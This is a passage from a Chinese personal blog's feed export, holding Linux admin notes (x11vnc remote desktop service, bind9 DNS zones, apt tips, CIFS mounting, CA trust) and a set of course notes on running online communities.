<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.6.0-25-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue 15 Jan 2021 10:08:49 AM CST</span><br><span class="line"></span><br><span class="line">  System load:  0.25               Processes:              356</span><br><span class="line">  Usage of /:   28.5% of 77.43GB   Users logged in:        0</span><br><span class="line">  Memory usage: 10%                IPv4 address for ens18: 192.168.0.1</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">5 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2025.</span><br><span class="line">Last login: Tue Jan 5 10:13:40 2021 from 192.168.0.2</span><br></pre></td></tr></table></figure>

<h3 id="8-2-x11vnc-linux远程桌面"><a href="#8-2-x11vnc-linux远程桌面" class="headerlink" title="8.2. x11vnc linux远程桌面"></a>8.2. x11vnc linux远程桌面</h3><p><strong>设置密码</strong></p>
<ul>
<li>默认储存到<code>/home/&lt;username&gt;/.vnc/passwd</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x11vnc -storepasswd</span><br></pre></td></tr></table></figure>

<p><strong>设置开机启动</strong></p>
<ul>
<li>写一个service文件到<code>/usr/lib/systemd/system/x11vnc.service</code></li>
<li>要修改passwd的路径</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Start x11vnc at startup.</span><br><span class="line"><span class="attr">After</span>=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/bin/x11vnc -auth guess -forever -loop -noxdamage -repeat -rfbauth /home/&lt;username&gt;/.vnc/passwd -rfbport <span class="number">5900</span> -shared -capslock</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>

<ul>
<li><code>systemctl enable x11vnc</code>，加到开机启动项中</li>
<li><code>service x11vnc start</code>，当前开启服务</li>
</ul>
<p><strong>无显示器模拟显示器</strong></p>
<ul>
<li>在没有显示器的情况下x11vnc特别慢，插上显示器就快了，因为没有显示器显卡不工作</li>
<li>安装<code>xserver-xorg-video-dummy</code>模拟显示器</li>
<li>新增配置文件<code>/usr/share/X11/xorg.conf.d/xorg.conf</code></li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">Section &quot;Device&quot;</span><br><span class="line">    Identifier  &quot;Configured Video Device&quot;</span><br><span class="line">    Driver      &quot;dummy&quot;</span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section &quot;Monitor&quot;</span><br><span class="line">    Identifier  &quot;Configured Monitor&quot;</span><br><span class="line">    HorizSync 31.5-48.5</span><br><span class="line">    VertRefresh 50-70</span><br><span class="line">    Modeline &quot;1920x1080&quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync</span><br><span class="line">    VideoRam 256000</span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section &quot;Screen&quot;</span><br><span class="line">    Identifier  &quot;Default Screen&quot;</span><br><span class="line">    Monitor     &quot;Configured Monitor&quot;</span><br><span class="line">    Device      &quot;Configured Video Device&quot;</span><br><span class="line">    DefaultDepth 24</span><br><span class="line">    SubSection &quot;Display&quot;</span><br><span class="line">        Depth 24</span><br><span class="line">        Modes &quot;1920x1080&quot;</span><br><span class="line">    EndSubSection</span><br><span class="line">EndSection</span><br></pre></td></tr></table></figure>

<ul>
<li>重启设备就好了</li>
</ul>
<p><strong>sddm管理桌面x11vnc起不来</strong></p>
<ul>
<li>可能需要单独写一个脚本处理，上面service的exec就指定这个脚本的目录即可</li>
<li>sddm使用单独的auth模式</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">while [ -z &quot;$(ls -t /run/sddm)&quot; ]; do</span><br><span class="line">    sleep 1</span><br><span class="line">done</span><br><span class="line">authFile=&quot;$(ls -t /run/sddm | head -n 1)&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/x11vnc -auth &quot;/run/sddm/$authFile&quot; -forever -loop -noxdamage -repeat -rfbauth &quot;/home/xxx/.vnc/passwd&quot; -rfbport 5900 -shared -capslock</span><br></pre></td></tr></table></figure>

<p><strong>gdm3管理桌面x11vnc起不来</strong></p>
<ul>
<li>同上，不过脚本变成下面这样</li>
<li>尝试的出现一个问题，当使用gdm3启动kde时，在桌面登陆前，没有<code>/run/user/1000/gdm/Xauthority</code>，需要先登录再启动</li>
<li>但是存在一个<code>/run/user/129/gdm/Xauthority</code>，这个可以打开登陆界面，登陆完这个就只有黑屏，需要使用上面的配置，并且<code>-dislay</code>需要设置成<code>:1</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">auth_file=&quot;/run/user/1000/gdm/Xauthority&quot;</span><br><span class="line"></span><br><span class="line">while [ ! -f &quot;$auth_file&quot; ]; do</span><br><span class="line">    sleep 1</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/x11vnc -auth &quot;$auth_file&quot; -forever -loop -noxdamage -repeat -rfbauth &quot;/home/xxx/.vnc/passwd&quot; -rfbport 5900 -shared -capslock</span><br></pre></td></tr></table></figure>

<h2 id="9-查看电量"><a href="#9-查看电量" class="headerlink" title="9. 查看电量"></a>9. 查看电量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /sys/class/power_supply/battery/capacity</span><br></pre></td></tr></table></figure>

<h2 id="10-当前运行命令转后台"><a href="#10-当前运行命令转后台" class="headerlink" title="10. 当前运行命令转后台"></a>10. 当前运行命令转后台</h2><ol>
<li><code>Ctrl + z</code>: 暂停当前程序</li>
<li><code>bg</code>: 后台继续运行暂停的程序</li>
</ol>
<p><strong>其他命令</strong></p>
<ul>
<li><code>fg</code>: 后台运行程序转前台</li>
<li><code>jobs</code>: 查看所有程序</li>
</ul>
<h2 id="12-shell脚本单例"><a href="#12-shell脚本单例" class="headerlink" title="12. shell脚本单例"></a>12. shell脚本单例</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 进程单例判断</span></span></span><br><span class="line">is_single_running() &#123;</span><br><span class="line">    local lockfile=$1</span><br><span class="line"></span><br><span class="line">    exec 100&gt; &quot;$lockfile&quot;</span><br><span class="line">    if /usr/bin/flock -xw 3 100</span><br><span class="line">    then</span><br><span class="line">        return 0</span><br><span class="line">    else</span><br><span class="line">        return 1</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 用法</span></span></span><br><span class="line">if ! is_single_running /tmp/xxx; then</span><br><span class="line">    echo &quot;has been running&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="13-挂载windows共享文件夹"><a href="#13-挂载windows共享文件夹" class="headerlink" title="13. 挂载windows共享文件夹"></a>13. 挂载windows共享文件夹</h2><ul>
<li><code>uid</code>和<code>gid</code>需要根据需要设置成对应的id，为挂在过来的所属用户和用户组</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看windows共享文件夹</span></span><br><span class="line">smbclient -U User -L //xxx.xxx.xxx.xxx/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂载</span></span><br><span class="line">mount -t cifs -o user=share,rw,uid=0,gid=0 //192.168.1.120/share /root/share</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记-2"><a href="#踩坑记-2" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-ssh用rsakey无法免密登陆"><a href="#1-ssh用rsakey无法免密登陆" class="headerlink" title="1. ssh用rsakey无法免密登陆"></a>1. ssh用rsakey无法免密登陆</h2><ul>
<li>sshd要求使用rsakey需要有以下权限限制<ul>
<li><code>/home/xxx</code>需要700权限，不允许用户组编辑</li>
<li><code>/home/xxx/.ssh</code>需要700权限</li>
<li><code>/home/xxx/authorized_keys</code>需要600权限</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu学习</title>
    <url>/blogs/2018-07-27-ubuntuStudy/</url>
    <content><![CDATA[<h1 id="一、gnome桌面操作"><a href="#一、gnome桌面操作" class="headerlink" title="一、gnome桌面操作"></a>一、gnome桌面操作</h1><h2 id="1-开机启动程序"><a href="#1-开机启动程序" class="headerlink" title="1. 开机启动程序"></a>1. 开机启动程序</h2><p>在命令行执行下面语句，然后配置即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gnome-session-properties</span><br></pre></td></tr></table></figure>

<h2 id="2-安装fcitx5"><a href="#2-安装fcitx5" class="headerlink" title="2. 安装fcitx5"></a>2. 安装fcitx5</h2><ul>
<li>ubuntu 20.04没有<code>fcitx5-configtool</code>，没有办法配置，只能使用纯文本配置</li>
</ul>
<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol>
<li>先安装</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install fcitx5 fcitx5-frontend-gtk3 fcitx5-frontend-gtk2</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>找个主题装上去</li>
<li>在网上找个配置替换<code>~/.config/fcitx5/*</code></li>
<li>执行<code>im-config</code>，选择fcitx5</li>
<li>添加环境变量</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/environment</span></span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>添加开机启动程序，参照上面</li>
<li>重启</li>
</ol>
<h2 id="3-快捷键"><a href="#3-快捷键" class="headerlink" title="3. 快捷键"></a>3. 快捷键</h2><ul>
<li><code>Ctrl + d</code>: 收藏文件夹</li>
</ul>
<h1 id="二、kde桌面操作"><a href="#二、kde桌面操作" class="headerlink" title="二、kde桌面操作"></a>二、kde桌面操作</h1><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><ul>
<li>需要安装<code>kubuntu-desktop</code>包，即为kde的ubuntu包</li>
<li>不知道为什么在<code>ubuntu 20.04</code>上面，<code>sddm</code>起不起来，所以需要安装<code>gdm3</code>来启动</li>
</ul>
<h2 id="2-安装fcitx5-1"><a href="#2-安装fcitx5-1" class="headerlink" title="2. 安装fcitx5"></a>2. 安装fcitx5</h2><ul>
<li>步骤同上，就是把<code>fcitx5-frontend-gtk3 fcitx5-frontend-gtk2</code>换成<code>fcitx5-frontend-gtk3 fcitx5-frontend-qt5</code></li>
</ul>
<h1 id="三、纯命令行的操作"><a href="#三、纯命令行的操作" class="headerlink" title="三、纯命令行的操作"></a>三、纯命令行的操作</h1><h2 id="1-apt安装软件"><a href="#1-apt安装软件" class="headerlink" title="1. apt安装软件"></a>1. apt安装软件</h2><h3 id="1-1-解决依赖关系"><a href="#1-1-解决依赖关系" class="headerlink" title="1.1. 解决依赖关系"></a>1.1. 解决依赖关系</h3><h4 id="不指名解决依赖关系"><a href="#不指名解决依赖关系" class="headerlink" title="不指名解决依赖关系"></a>不指名解决依赖关系</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt --fix-broken install</span><br></pre></td></tr></table></figure>

<h3 id="1-2-忽略某个包的更新"><a href="#1-2-忽略某个包的更新" class="headerlink" title="1.2. 忽略某个包的更新"></a>1.2. 忽略某个包的更新</h3><p>使用以下命令可以忽略某个包的更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-mark hold (pack)</span><br></pre></td></tr></table></figure>

<p>取消忽略</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-mark unhold (pack)</span><br></pre></td></tr></table></figure>

<h3 id="1-3-清除已经删除的软件的配置"><a href="#1-3-清除已经删除的软件的配置" class="headerlink" title="1.3. 清除已经删除的软件的配置"></a>1.3. 清除已经删除的软件的配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -l |grep &quot;^rc&quot;|awk &#x27;&#123;print $2&#125;&#x27; |xargs apt -y purge</span><br></pre></td></tr></table></figure>

<h3 id="1-4-添加-删除ppa源"><a href="#1-4-添加-删除ppa源" class="headerlink" title="1.4. 添加&#x2F;删除ppa源"></a>1.4. 添加&#x2F;删除ppa源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加ppa源</span></span><br><span class="line">sudo add-apt-repository xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除ppa源</span></span><br><span class="line">sudo add-apt-repository -r xxx</span><br></pre></td></tr></table></figure>

<h3 id="1-5-下载包不安装"><a href="#1-5-下载包不安装" class="headerlink" title="1.5. 下载包不安装"></a>1.5. 下载包不安装</h3><ul>
<li>使用下面命令进行下载，下载的包在<code>/var/cache/apt/archives/</code>下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">没有安装的包</span></span><br><span class="line">sudo apt install -d xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">已经安装过的包</span></span><br><span class="line">sudo apt reinstall -d xxx</span><br></pre></td></tr></table></figure>

<h3 id="1-6-包和文件互查"><a href="#1-6-包和文件互查" class="headerlink" title="1.6. 包和文件互查"></a>1.6. 包和文件互查</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找包安装的文件列表</span></span><br><span class="line">=&gt; dpkg -L openssl</span><br><span class="line">/.</span><br><span class="line">/usr</span><br><span class="line">/usr/lib</span><br><span class="line">/usr/lib/ssl</span><br><span class="line">/usr/lib/ssl/misc</span><br><span class="line">...</span><br><span class="line">=&gt; dpkg-query -S /usr/bin/openssl</span><br><span class="line">openssl: /usr/bin/openssl</span><br></pre></td></tr></table></figure>

<h2 id="2-设置默认终端"><a href="#2-设置默认终端" class="headerlink" title="2. 设置默认终端"></a>2. 设置默认终端</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gsettings set org.gnome.desktop.default-applications.terminal exec /usr/bin/terminator</span><br><span class="line">gsettings set org.gnome.desktop.default-applications.terminal exec-arg &quot;-x&quot;</span><br></pre></td></tr></table></figure>

<h2 id="3-添加移除开机启动程序"><a href="#3-添加移除开机启动程序" class="headerlink" title="3. 添加移除开机启动程序"></a>3. 添加移除开机启动程序</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-rc.d xxx enable/disable</span><br></pre></td></tr></table></figure>

<h2 id="4-添加编码"><a href="#4-添加编码" class="headerlink" title="4. 添加编码"></a>4. 添加编码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales   # 跟着步骤配一下自己需要的编码</span><br></pre></td></tr></table></figure>

<h2 id="5-apt-file-查看文件所在包的位置"><a href="#5-apt-file-查看文件所在包的位置" class="headerlink" title="5. apt-file 查看文件所在包的位置"></a>5. apt-file 查看文件所在包的位置</h2><ul>
<li>使用<code>apt-file</code>可以查看</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">=&gt; sudo apt install apt-file</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新数据库</span></span><br><span class="line">=&gt; sudo apt-file update</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找文件</span></span><br><span class="line">=&gt; apt-file search &quot;dbus/dbus.h&quot;</span><br><span class="line">libdbus-1-dev: /usr/include/dbus-1.0/dbus/dbus.h</span><br></pre></td></tr></table></figure>

<h1 id="四、一些软件的安装配置"><a href="#四、一些软件的安装配置" class="headerlink" title="四、一些软件的安装配置"></a>四、一些软件的安装配置</h1><h2 id="1-bind9-搭建dns服务器"><a href="#1-bind9-搭建dns服务器" class="headerlink" title="1. bind9 搭建dns服务器"></a>1. bind9 搭建dns服务器</h2><p>参考 <a href="https://blog.csdn.net/weixin_37813152/article/details/122521851">Ubuntu 用bind9搭建DNS服务器</a></p>
<h3 id="1-1-安装启动"><a href="#1-1-安装启动" class="headerlink" title="1.1. 安装启动"></a>1.1. 安装启动</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install bind9</span><br><span class="line">sudo systemctl enable bind9</span><br><span class="line">sudo systemctl start bind9</span><br></pre></td></tr></table></figure>

<h3 id="1-2-添加dns正向解析记录"><a href="#1-2-添加dns正向解析记录" class="headerlink" title="1.2. 添加dns正向解析记录"></a>1.2. 添加dns正向解析记录</h3><ol>
<li>编辑<code>/etc/bind/named.conf.local</code>，添加下面的记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;proxy.com&quot; &#123;</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;/etc/bind/zones/db.proxy.com&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>新建文件<code>/etc/bind/zones/db.proxy.com</code>，目录不存在就创建，内容如下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">; BIND data file for local loopback interface</span><br><span class="line">;</span><br><span class="line">$TTL    604800</span><br><span class="line">@       IN      SOA     proxy.com. root.proxy.com. (</span><br><span class="line">                              2         ; Serial</span><br><span class="line">                         604800         ; Refresh</span><br><span class="line">                          86400         ; Retry</span><br><span class="line">                        2419200         ; Expire</span><br><span class="line">                         604800 )       ; Negative Cache TTL</span><br><span class="line">; proxy.com</span><br><span class="line">@       IN  A   199.200.2.170</span><br><span class="line">; www.proxy.com</span><br><span class="line">@       IN  NS  www</span><br><span class="line">www     IN  A   199.200.2.170</span><br><span class="line">www     IN  A   199.200.2.183</span><br><span class="line">; test.proxy.com</span><br><span class="line">@       IN  NS  test</span><br><span class="line">test    IN  A   199.200.2.170</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>重启bind9服务就可以解析<code>proxy.com</code>、<code>www.proxy.com</code>、<code>test.proxy.com</code></li>
</ol>
<h3 id="1-3-添加反向记录-PTR"><a href="#1-3-添加反向记录-PTR" class="headerlink" title="1.3. 添加反向记录 PTR"></a>1.3. 添加反向记录 PTR</h3><ul>
<li>反向记录一般是nslookup用于展示dns服务器地址的域名使用</li>
<li>如下面的结果会发起一个 <code>101.17.240.10.in-addr.arpa</code> 的 <code>PTR</code> 请求</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; nslookup www.testweb.com</span><br><span class="line">Server:  dns.proxy.com</span><br><span class="line">Address:  10.240.17.101</span><br><span class="line"></span><br><span class="line">Name:    www.testweb.com</span><br><span class="line">Address:  199.200.2.170</span><br></pre></td></tr></table></figure>

<ol>
<li>编辑<code>/etc/bind/named.conf.local</code>，添加下面的记录，添加<code>10.240.17.0/24</code>的反查记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;17.240.10.in-addr.arpa&quot; &#123;</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;/etc/bind/zones/17.240.10.zone&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>新增文件<code>/etc/bind/zones/17.240.10.zone</code>，<code>NS</code>是必须的，添加101的解析</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">; BIND data file for local loopback interface</span><br><span class="line">;</span><br><span class="line">$TTL    604800</span><br><span class="line">@       IN      SOA     proxy.com. root.proxy.com. (</span><br><span class="line">                              2         ; Serial</span><br><span class="line">                         604800         ; Refresh</span><br><span class="line">                          86400         ; Retry</span><br><span class="line">                        2419200         ; Expire</span><br><span class="line">                         604800 )       ; Negative Cache TTL</span><br><span class="line">; dns.proxy.com</span><br><span class="line">@       IN  NS      dns.proxy.com.</span><br><span class="line">101     IN  PTR     dns.proxy.com.</span><br></pre></td></tr></table></figure>

<h2 id="2-lightdm-使用vnc远程连接"><a href="#2-lightdm-使用vnc远程连接" class="headerlink" title="2. lightdm 使用vnc远程连接"></a>2. lightdm 使用vnc远程连接</h2><ul>
<li>需要安装<code>tigervnc-standalone-server</code>和<code>tigervnc-common</code></li>
<li>其他参考 <a href="/blogs/2021-04-02-archlinux/#1-4-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2">archlinux配置lightdm远程桌面</a></li>
</ul>
<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-ubuntu安装deepin-terminal，设置默认"><a href="#1-ubuntu安装deepin-terminal，设置默认" class="headerlink" title="1. ubuntu安装deepin-terminal，设置默认"></a>1. ubuntu安装deepin-terminal，设置默认</h2><ul>
<li><code>x-terminal-emulator</code>里面没有<code>deepin-terminal</code>，无法更新成默认terminal</li>
<li>需要执行下面命令进行注册</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注册deepin-terminal</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/x-terminal-emulator x-terminal-emulator /usr/bin/deepin-terminal 50</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认终端</span></span><br><span class="line">sudo update-alternatives --config x-terminal-emulator</span><br></pre></td></tr></table></figure>

<h2 id="2-信任CA证书"><a href="#2-信任CA证书" class="headerlink" title="2. 信任CA证书"></a>2. 信任CA证书</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp xxx.crt /usr/local/share/ca-certificates</span><br><span class="line">sudo update-ca-certificates</span><br></pre></td></tr></table></figure>

<ul>
<li>删除和新增同理，都只需要文件删除和添加执行命令即可</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>点石创校第八次课程笔记--社群管理</title>
    <url>/blogs/2018-05-03-shequnguanli/</url>
    <content><![CDATA[<h1 id="给你一个社群你会怎么管"><a href="#给你一个社群你会怎么管" class="headerlink" title="给你一个社群你会怎么管"></a>给你一个<strong>社群</strong>你会怎么管</h1><p>主讲人:秋叶大叔</p>
<h2 id="你的企业要不要搞社群？"><a href="#你的企业要不要搞社群？" class="headerlink" title="你的企业要不要搞社群？"></a>你的企业要不要搞社群？</h2><p>超级用户 &#x3D; 超级热爱 + 自带流量</p>
<ul>
<li>可以当大喇叭</li>
<li>热爱但没流量–帮打造微ip</li>
<li>有流量不热爱–带打造特长</li>
</ul>
<h3 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h3><ul>
<li>如何打破互联网巨头的流量垄断？</li>
<li>如何应对越来越贵的流量？</li>
<li>如何解决垃圾流量的干扰？</li>
</ul>
<h3 id="解局"><a href="#解局" class="headerlink" title="解局"></a>解局</h3><ul>
<li>10%的超级用户带来70%的增长</li>
<li>超级用户会持续购买你的商品</li>
<li>超级用户会义务替你宣传和推广</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul>
<li>keep：寻找健身达人做社群助教</li>
<li>毛衣到毛线</li>
</ul>
<h3 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h3><ul>
<li>控</li>
<li>发烧</li>
<li>DIY</li>
</ul>
<h2 id="你的行业有超级名师吗？"><a href="#你的行业有超级名师吗？" class="headerlink" title="你的行业有超级名师吗？"></a>你的行业有超级名师吗？</h2><p>超级名师 &#x3D; 品牌课程 + 热门平台</p>
<ul>
<li>卡值精准标签</li>
<li>卡值热门平台</li>
</ul>
<h3 id="过去"><a href="#过去" class="headerlink" title="过去"></a>过去</h3><ul>
<li>教育行业从来都是打造名师</li>
<li>超级名师成为企业的代言人</li>
<li>靠出书演讲吸引更多人报名</li>
</ul>
<h3 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h3><ul>
<li>知识付费推广行业越来越多</li>
<li>超级名师的舞台 &#x3D; 线上 + 线下</li>
<li>裂变 + 分销，用知识做导流</li>
</ul>
<h2 id="你的身边有超级圈子吗？"><a href="#你的身边有超级圈子吗？" class="headerlink" title="你的身边有超级圈子吗？"></a>你的身边有超级圈子吗？</h2><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><ul>
<li>最早的社群往往是关系网</li>
<li>不同能量的人加入不同圈子</li>
<li>借助圈子社交空间打开可能</li>
</ul>
<h3 id="生态"><a href="#生态" class="headerlink" title="生态"></a>生态</h3><ul>
<li>越是高价值的人越重视关系经营</li>
<li>从经营关系到经营生态</li>
<li>从经营生态到共同成长和抵抗风险</li>
</ul>
<h3 id="三个关键词帮你发现超级圈子"><a href="#三个关键词帮你发现超级圈子" class="headerlink" title="三个关键词帮你发现超级圈子"></a>三个关键词帮你发现超级圈子</h3><ul>
<li>共同话题</li>
<li>地理接近</li>
<li>运营给力</li>
</ul>
<p>宝妈–超级圈子</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>会员营销</td>
<td>如果你有很多很多用户，要管起来</td>
</tr>
<tr>
<td>活动营销</td>
<td>如果你有很多潜在用户，要做线上线下活动促销</td>
</tr>
<tr>
<td>客户关系管理</td>
<td>如果你有很多高端客户，要做服务</td>
</tr>
<tr>
<td>公关运营</td>
<td>如果你有很多高端人脉，需要运营</td>
</tr>
<tr>
<td>社群运营</td>
<td>如果你的产品有用户狂热喜爱，需要连接</td>
</tr>
</tbody></table>
<p>不要用流量管理社群<br>社群的价值在社群之外</p>
<ul>
<li>一个社群不是比规模</li>
<li>而是比资源调度能量</li>
</ul>
<p>2018，社群元年<br>从<strong>流量思维</strong>到<strong>运营思维</strong></p>
<h3 id="三种商业化社群运营模式"><a href="#三种商业化社群运营模式" class="headerlink" title="三种商业化社群运营模式"></a>三种商业化社群运营模式</h3><ul>
<li>整合模式<ul>
<li>以产品为中心</li>
<li>整合超级用户</li>
<li>挖掘<strong>策划</strong>人才</li>
<li>开发CRM系统</li>
</ul>
</li>
<li>链接模式<ul>
<li>以个人为中心</li>
<li>打造超级名师</li>
<li>培养<strong>链接</strong>人才</li>
<li>启动粉丝运营</li>
</ul>
</li>
<li>运营模式<ul>
<li>以关系为中心</li>
<li>加入超级圈子</li>
<li>打造<strong>服务</strong>团队</li>
<li>进行人脉交换</li>
</ul>
</li>
</ul>
<h4 id="整合模式适合冷启动"><a href="#整合模式适合冷启动" class="headerlink" title="整合模式适合冷启动"></a>整合模式适合冷启动</h4><p>找到能成为超级用户1000个铁杆粉丝</p>
<h4 id="链接模式适合小而美"><a href="#链接模式适合小而美" class="headerlink" title="链接模式适合小而美"></a>链接模式适合小而美</h4><p>找对同频的人，做一件美好的事情</p>
<h4 id="运营模式适合规模化"><a href="#运营模式适合规模化" class="headerlink" title="运营模式适合规模化"></a>运营模式适合规模化</h4><p>给你10000个社群，你靠什么管？</p>
<h3 id="三种社群运营模式"><a href="#三种社群运营模式" class="headerlink" title="三种社群运营模式"></a>三种社群运营模式</h3><ul>
<li>自建社群–慢运营模式</li>
<li>打入社群–快启动模式</li>
<li>包养社群–有钱人模式</li>
</ul>
<h3 id="好社群要有门槛"><a href="#好社群要有门槛" class="headerlink" title="好社群要有门槛"></a>好社群要有门槛</h3><h4 id="邀约入群的4种门槛"><a href="#邀约入群的4种门槛" class="headerlink" title="邀约入群的4种门槛"></a>邀约入群的4种门槛</h4><ul>
<li>邀约入群</li>
<li>申请入群</li>
<li>任务入群</li>
<li>付费入群</li>
</ul>
<h4 id="好社群要开始就让群员多元化"><a href="#好社群要开始就让群员多元化" class="headerlink" title="好社群要开始就让群员多元化"></a>好社群要开始就让群员多元化</h4><h4 id="好的社群人员结构是怎样的？"><a href="#好的社群人员结构是怎样的？" class="headerlink" title="好的社群人员结构是怎样的？"></a>好的社群人员结构是怎样的？</h4><ul>
<li>灵魂人物：要有灵魂人物，而且灵魂人物大家都认可</li>
<li>多元势能：如大咖占5%、中咖占20%、普通人占75%</li>
<li>多种个性：“老司机”戏弄新加入的“小清新”</li>
<li>多种标签：总有意想不到的牛人冒出来解决你的问题</li>
</ul>
<h3 id="好社群的特征"><a href="#好社群的特征" class="headerlink" title="好社群的特征"></a>好社群的特征</h3><ul>
<li>好名字自带流量</li>
<li>好社群吸引大咖</li>
<li>好活动传播口碑</li>
</ul>
<h2 id="如何管理好社群？"><a href="#如何管理好社群？" class="headerlink" title="如何管理好社群？"></a>如何管理好社群？</h2><p>退群测试</p>
